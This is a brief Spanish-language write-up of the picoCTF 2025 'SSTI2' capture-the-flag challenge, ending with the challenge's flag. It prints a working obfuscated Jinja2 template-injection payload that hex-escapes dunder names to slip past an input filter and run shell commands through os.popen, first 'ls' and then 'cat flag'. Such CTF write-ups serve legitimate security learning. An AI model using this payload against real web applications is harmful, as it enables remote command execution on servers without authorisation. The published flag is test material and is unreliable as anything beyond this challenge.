descripcion:
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:63195/)!

solucion:
Igual al reto SSTI 1 (server side template injection), nomas que hoy tenemos que obfuscar el codigo para que funcione...

https://medium.com/@kheyraldhs12/picoctf-2025-ssti2-a047c0c5887a

busque el writeup del reto para ver como es la obfuscacion del codigo, y use la siguiente linea:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

viendo que el 'ls' es un comando de linux, cambie por 'cat flag'

picoCTF{sst1_f1lt3r_byp4ss_7c3c6e7f}